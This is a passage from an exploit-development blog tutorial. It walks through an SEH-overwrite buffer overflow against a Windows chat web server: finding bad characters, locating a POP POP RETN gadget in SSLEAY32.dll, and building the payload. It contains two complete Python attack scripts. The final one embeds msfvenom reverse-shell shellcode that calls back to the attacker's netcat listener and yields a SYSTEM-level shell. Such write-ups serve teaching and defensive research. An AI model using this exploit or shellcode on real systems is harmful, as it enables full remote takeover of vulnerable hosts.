<p>An additional complication is the need to avoid including so called &#8216;bad characters&#8217; in the authentication request argument. Bad characters are those which are not interpreted as literal characters by the server code, but are instead interpreted as an directive to perform an action. An example is the hex values <strong>\x00 </strong>which would be interpreted as a line terminator, preventing anything after it in the character sequence from being written to memory and hence sabotaging the exploit. <strong>\x20</strong> would have similar effect as it would be interpreted as space character. We need to bear this in mind when looking for modules containing candidate POP POP RETN instruction sequences; we won&#8217;t be able to make use of modules whose entry point addresses contain bad characters. In fact, this is also the case for any values we include in our exploit string.</p>
<p>From the Executable Modules view in OllyDbg, we can see that the library &#8220;SSLEAY32.dll&#8221; has an entry point address which doesn&#8217;t start with a bad character, so this appears to be a good candidate. Let&#8217;s use the OllyDbg <a href="http://www.openrce.org/downloads/details/244/ollysseh">SSEH plugin</a> to see if it has SafeSEH enabled:</p>
<p><figure id="attachment_121" aria-describedby="caption-attachment-121" style="width: 665px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/06/ecs-win-028.png"><img loading="lazy" decoding="async" class="wp-image-121" src="./../../../wp-content/uploads/2017/06/ecs-win-028-300x93.png" alt="" width="665" height="206" srcset="./../../../wp-content/uploads/2017/06/ecs-win-028-300x93.png 300w, ./../../../wp-content/uploads/2017/06/ecs-win-028-768x239.png 768w, ./../../../wp-content/uploads/2017/06/ecs-win-028-210x65.png 210w, ./../../../wp-content/uploads/2017/06/ecs-win-028.png 838w" sizes="(max-width: 665px) 100vw, 665px" /></a><figcaption id="caption-attachment-121" class="wp-caption-text">Listing modules compiled without SafeSEH using the OllyDbg <a href="http://www.openrce.org/downloads/details/244/ollysseh">SSEH plugin </a></figcaption></figure></p>
<p>SafeSEH is not enabled on the SSLEAY32.dll library so we should be able to convince the system to redirect execution here during exception handling without it complaining. Now let&#8217;s see if we can find a suitable POP POP RETN instruction sequence within this module. If we open the module code view, we can then use OllyDbg&#8217;s &#8220;Search For Sequence Of Commands&#8221; utility specifying wildcards for the POP instruction registers:</p>
<p><figure id="attachment_122" aria-describedby="caption-attachment-122" style="width: 670px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/06/ecs-win-029.png"><img loading="lazy" decoding="async" class="wp-image-122" src="./../../../wp-content/uploads/2017/06/ecs-win-029-300x201.png" alt="" width="670" height="449" srcset="./../../../wp-content/uploads/2017/06/ecs-win-029-300x201.png 300w, ./../../../wp-content/uploads/2017/06/ecs-win-029-210x140.png 210w, ./../../../wp-content/uploads/2017/06/ecs-win-029.png 600w" sizes="(max-width: 670px) 100vw, 670px" /></a><figcaption id="caption-attachment-122" class="wp-caption-text">Searching for POP POP RETN instruction sequences within the libary</figcaption></figure></p>
<p>There are several candidate sequences to choose from, so we&#8217;ll pick the one at address <code class="EnlighterJSRAW" data-enlighter-language="asm">0x10011d82</code> <strong>NB:</strong> <em>Because we are dealing with an Intel processor which uses <a href="https://en.wikipedia.org/wiki/Endianness">little endian</a> encoding, and OllyDbg shows us addresses as hex values, we will need to reverse the byte ordering when we insert this address into our exploit code</em>.</p>
<p>Now that we have a mechanism to cause execution to flow from the fake SEH handler function pointer to the next SEH handler pointer, the next stage is to work out how to cause execution to be redirected to final stage exploit code. Because we know that we are able to overflow into the stack beyond the SEH handler function pointer, we can locate our final stage exploit code there. In addition, because we know that the SEH handler function pointer occupies the 4 bytes directly after the next SEH handler pointer, we can overwrite the data referenced by the next SEH pointer with some instructions to cause execution to jump over the SEH handler function pointer to our final stage exploit code.</p>
<p>The next SEH handler pointer occupies 4 bytes, as does the SEH handler function pointer. A short jump instruction will occupy 2 bytes in total, so we need to update add an instruction to jump forward by 6 bytes, padding the 2 bytes after the jump instruction with no-operation opcodes.</p>
<p>Putting all of the above together and updating the attack script, we now have:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python" data-enlighter-theme="twilight">#!/usr/bin/env python

import socket

victim_host = "192.168.0.55"
victim_port= 80
usr_tok = "%USR%"
get_request_template = (
"GET /chat.ghp?username=" + usr_tok + "&amp;password=password&amp;room=1&amp;sex=1 HTTP/1.1\r\n"
"Host: 192.168.0.55\r\n"
"User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0\r\n"
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
"Accept-Language: en-US,en;q=0.5\r\n"
"Referer: http://192.168.0.55/\r\n"
"Connection: Keep-Alive\r\n\r\n"
)

usr_name = "A" * 203
usr_name += "\xeb\x06\x90\x90" # jmp +6 bytes, NOP, NOP
usr_name += "\x82\x1d\x01\x10"  # command sequence: pop EBP, pop EBX, retn: candidate found at 0x10011d82 in executable module SSLEAY32.DLL
usr_name += "ABCDEFGHIJKLMNOPQRSTUVWXYZ" # placeholder for shellcode
usr_name += "B" * 59

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn = sock.connect((victim_host, victim_port))
content = get_request_template.replace(usr_tok, usr_name)
#print content
sock.send(content)
rx = sock.recv(1024)
if len(rx) &gt; 0:
    print rx
sock.close()</pre>
<p>After restarting the server and resending the updated authentication request, the following results are visible in the debugger:</p>
<p><a href="./../../../wp-content/uploads/2017/06/ecs-win-015.png"><img loading="lazy" decoding="async" class="wp-image-126 aligncenter" src="./../../../wp-content/uploads/2017/06/ecs-win-015-300x157.png" alt="" width="659" height="345" srcset="./../../../wp-content/uploads/2017/06/ecs-win-015-300x157.png 300w, ./../../../wp-content/uploads/2017/06/ecs-win-015-210x110.png 210w, ./../../../wp-content/uploads/2017/06/ecs-win-015.png 445w" sizes="(max-width: 659px) 100vw, 659px" /></a></p>
<p>We can see that:</p>
<ul>
<li>The next SEH pointer has been overwritten with 0x909006EB, which equates to <code class="EnlighterJSRAW" data-enlighter-language="null">JMP 06 NOP NOP</code></li>
<li>The SEH handler has been overwritten with 0x100111D82, which is the address of the POP POP RETN instruction sequence within the SSLEAY32.dll library</li>
<li>Our final stage exploit code (represented at the moment with the placeholder character sequence &#8220;ABCDEFG&#8230;&#8221;) is located immediatety after the SEH handler function pointer.</li>
</ul>
<h2>End Game</h2>
<p>All we need to do now is generate the final stage exploit &#8211; the payload &#8211; and deliver this via our malicious authentication script instead of the placeholder character sequence.</p>
<p>Our goal is to establish a remote connection to the machine hosting the server process. We can again make use of the Metasploit Framework to do this for us. The <a href="https://www.offensive-security.com/metasploit-unleashed/msfvenom/">msfvenom</a> tool will generate the shellcode for an executable payload for us, all we need to do is specify the type of payload we want, add some arguments which specify the details of the attack host, i.e. the machine we want the remote shell to connect back to once it has been injected into and executed on the target:</p>
<p><figure id="attachment_44" aria-describedby="caption-attachment-44" style="width: 650px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-10-57-37.png"><img loading="lazy" decoding="async" class="wp-image-44" src="./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-10-57-37-300x238.png" alt="" width="650" height="516" srcset="./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-10-57-37-300x238.png 300w, ./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-10-57-37-768x608.png 768w, ./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-10-57-37-210x166.png 210w, ./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-10-57-37.png 960w" sizes="(max-width: 650px) 100vw, 650px" /></a><figcaption id="caption-attachment-44" class="wp-caption-text">Using msfvenom to generate payload shellcode</figcaption></figure></p>
<p>We now have some shellcode which will establish a remote TCP based connection from the target host back to our attack host, so let&#8217;s update the authentication script to include it:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python" data-enlighter-theme="twilight">#!/usr/bin/env python
import socket

victim_host = "192.168.0.55"
victim_port= 80
usr_tok = "%USR%"
get_request_template = (
"GET /chat.ghp?username=" + usr_tok + "&amp;password=password&amp;room=1&amp;sex=1 HTTP/1.1\r\n"
"Host: 192.168.0.55\r\n"
"User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0\r\n"
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
"Accept-Language: en-US,en;q=0.5\r\n"
"Referer: http://192.168.0.55/\r\n"
"Connection: Keep-Alive\r\n\r\n"
)
shellcode = (
"\xdb\xd8\xb8\x4b\x26\xf4\x34\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
"\x52\x31\x43\x17\x03\x43\x17\x83\x88\x22\x16\xc1\xf2\xc3\x54"
"\x2a\x0a\x14\x39\xa2\xef\x25\x79\xd0\x64\x15\x49\x92\x28\x9a"
"\x22\xf6\xd8\x29\x46\xdf\xef\x9a\xed\x39\xde\x1b\x5d\x79\x41"
"\x98\x9c\xae\xa1\xa1\x6e\xa3\xa0\xe6\x93\x4e\xf0\xbf\xd8\xfd"
"\xe4\xb4\x95\x3d\x8f\x87\x38\x46\x6c\x5f\x3a\x67\x23\xeb\x65"
"\xa7\xc2\x38\x1e\xee\xdc\x5d\x1b\xb8\x57\x95\xd7\x3b\xb1\xe7"
"\x18\x97\xfc\xc7\xea\xe9\x39\xef\x14\x9c\x33\x13\xa8\xa7\x80"
"\x69\x76\x2d\x12\xc9\xfd\x95\xfe\xeb\xd2\x40\x75\xe7\x9f\x07"
"\xd1\xe4\x1e\xcb\x6a\x10\xaa\xea\xbc\x90\xe8\xc8\x18\xf8\xab"
"\x71\x39\xa4\x1a\x8d\x59\x07\xc2\x2b\x12\xaa\x17\x46\x79\xa3"
"\xd4\x6b\x81\x33\x73\xfb\xf2\x01\xdc\x57\x9c\x29\x95\x71\x5b"
"\x4d\x8c\xc6\xf3\xb0\x2f\x37\xda\x76\x7b\x67\x74\x5e\x04\xec"
"\x84\x5f\xd1\xa3\xd4\xcf\x8a\x03\x84\xaf\x7a\xec\xce\x3f\xa4"
"\x0c\xf1\x95\xcd\xa7\x08\x7e\x32\x9f\x12\x48\xda\xe2\x12\x84"
"\x23\x6a\xf4\x8e\x43\x3a\xaf\x26\xfd\x67\x3b\xd6\x02\xb2\x46"
"\xd8\x89\x31\xb7\x97\x79\x3f\xab\x40\x8a\x0a\x91\xc7\x95\xa0"
"\xbd\x84\x04\x2f\x3d\xc2\x34\xf8\x6a\x83\x8b\xf1\xfe\x39\xb5"
"\xab\x1c\xc0\x23\x93\xa4\x1f\x90\x1a\x25\xed\xac\x38\x35\x2b"
"\x2c\x05\x61\xe3\x7b\xd3\xdf\x45\xd2\x95\x89\x1f\x89\x7f\x5d"
"\xd9\xe1\xbf\x1b\xe6\x2f\x36\xc3\x57\x86\x0f\xfc\x58\x4e\x98"
"\x85\x84\xee\x67\x5c\x0d\x1e\x22\xfc\x24\xb7\xeb\x95\x74\xda"
"\x0b\x40\xba\xe3\x8f\x60\x43\x10\x8f\x01\x46\x5c\x17\xfa\x3a"
"\xcd\xf2\xfc\xe9\xee\xd6"
)

usr_name = "A" * 203
usr_name += "\xeb\x06\x90\x90" # jmp +6 bytes, NOP, NOP
usr_name += "\x82\x1d\x01\x10" # command sequence: pop EBP, pop EBX, retn: candidate found at 0x10011d82 in executable module SSLEAY32.DLL
usr_name += "\x90" * 16 # create some stack space for the reverse shell decoder generated and included by msfvenom
usr_name += shellcode

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn = sock.connect((victim_host, victim_port))
content = get_request_template.replace(usr_tok, usr_name)
sock.send(content)
rx = sock.recv(1024)
if len(rx) &gt; 0:
print rx
sock.close()

</pre>
<p>After restarting the server and resending the updated authentication request, the following results are visible in the debugger &#8211; first of all, the system detects the access violation caused by the buffer overflow and attempts to handle the exception using SEH. Because the SEH handler function pointer has been overwritten with the address of the POP POP RETN instructions within SSLEAY32.dll, this address gets loaded into the EIP and the library instructions get executed:</p>
<p><a href="./../../../wp-content/uploads/2017/06/ecs-win-021.png"><img loading="lazy" decoding="async" class="wp-image-37 aligncenter" src="./../../../wp-content/uploads/2017/06/ecs-win-021-300x166.png" alt="" width="652" height="361" srcset="./../../../wp-content/uploads/2017/06/ecs-win-021-300x166.png 300w, ./../../../wp-content/uploads/2017/06/ecs-win-021-768x425.png 768w, ./../../../wp-content/uploads/2017/06/ecs-win-021-210x116.png 210w, ./../../../wp-content/uploads/2017/06/ecs-win-021.png 820w" sizes="(max-width: 652px) 100vw, 652px" /></a></p>
<p>The POP POP instructions cause the ESP to point to the address of the next SEH handler; the RETN causes the EIP to to be loaded with this address and execution gets redirected to this location. As we have overwritten the next SEH handler pointer with our short jump instructions, this gets executed next:</p>
<p><a href="./../../../wp-content/uploads/2017/06/ecs-win-024.png"><img loading="lazy" decoding="async" class="wp-image-38 aligncenter" src="./../../../wp-content/uploads/2017/06/ecs-win-024-300x130.png" alt="" width="651" height="282" srcset="./../../../wp-content/uploads/2017/06/ecs-win-024-300x130.png 300w, ./../../../wp-content/uploads/2017/06/ecs-win-024-1024x445.png 1024w, ./../../../wp-content/uploads/2017/06/ecs-win-024-768x334.png 768w, ./../../../wp-content/uploads/2017/06/ecs-win-024-210x91.png 210w, ./../../../wp-content/uploads/2017/06/ecs-win-024.png 1366w" sizes="(max-width: 651px) 100vw, 651px" /></a></p>
<p>After the jump, the EIP now points to the <a href="https://en.wikipedia.org/wiki/NOP_slide">NOP sled</a> at the start of our shellcode (an arbitrary number of NOP&#8217;s have been added to allow space for the reverse shell decoder generated by msfvenom and prepended to the shellcode):</p>
<p><a href="./../../../wp-content/uploads/2017/06/ecs-win-025.png"> <img loading="lazy" decoding="async" class="wp-image-39 aligncenter" src="./../../../wp-content/uploads/2017/06/ecs-win-025-300x167.png" alt="" width="652" height="363" srcset="./../../../wp-content/uploads/2017/06/ecs-win-025-300x167.png 300w, ./../../../wp-content/uploads/2017/06/ecs-win-025-210x117.png 210w, ./../../../wp-content/uploads/2017/06/ecs-win-025.png 733w" sizes="(max-width: 652px) 100vw, 652px" /></a></p>
<p>To determine whether a remote shell can be successfully established on the target host, first we start a <a href="http://nc110.sourceforge.net/">netcat</a> listener on our attack machine to listen for any incoming connections on the port we specified when we generated the shellcode for our payload, then allow the server execution to continue:</p>
<p><a href="./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-10-59-31.png"><img loading="lazy" decoding="async" class="wp-image-47 aligncenter" src="./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-10-59-31-300x101.png" alt="" width="650" height="219" srcset="./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-10-59-31-300x101.png 300w, ./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-10-59-31-210x70.png 210w, ./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-10-59-31.png 647w" sizes="(max-width: 650px) 100vw, 650px" /></a></p>
<p><a href="./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-11-40-23.png"><img loading="lazy" decoding="async" class="wp-image-46 aligncenter" src="./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-11-40-23-300x168.png" alt="" width="641" height="359" srcset="./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-11-40-23-300x168.png 300w, ./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-11-40-23-210x118.png 210w, ./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-11-40-23.png 646w" sizes="(max-width: 641px) 100vw, 641px" /></a></p>
<p>The target machine has now been fully compromised; the remote shell we injected has been executed and it has successfully established a connection with the netcat listener on our attack machine. The shell will execute with the same level of privilege as the account which was used to spawn the compromised server process. Issuing a simple &#8220;<a href="https://technet.microsoft.com/en-us/library/cc771299(v=ws.11).aspx">whoami</a>&#8221; command to the compromised host via this shell shows us that the server process must have been executed as a system process under the built in <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms684190(v=vs.85).aspx">Windows LocalSystem</a> account, meaning that our shell has the highest level of administration rights on the host system, and will permit us to perform actions invaluable to a malicious actor attacking the system, e.g. creating new user accounts, installing software, disabling firewalls, even pivoting to other hosts on normally inaccessible networks. <strong>NB:</strong> <em>Port 12345 is an arbitrary choice used here for illustrative purposes. Network reconnaissance carried out in advance of an attack such as this would aim to identify a suitable open port for the reverse shell to use</em>.</p>
<h2>Epilogue</h2>
<p>In addition to SafeSEH and SEHOP, there are several other Windows memory defence mechanisms, including <a href="https://msdn.microsoft.com/en-us/library/bb384887.aspx">Address Space Layout Randomisation</a> (ASLR) and <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa366553(v=vs.85).aspx">Data Execution Prevention</a> (DEP), which aim to prevent exploits such as the one studied here. However, the number of end-of-life and unpatched operating systems and vulnerable applications still in active use means that SEH abuse will probably remain a viable exploit technique for some time to come.</p>
]]></content:encoded>
					
		
		
			</item>
	</channel>
</rss>
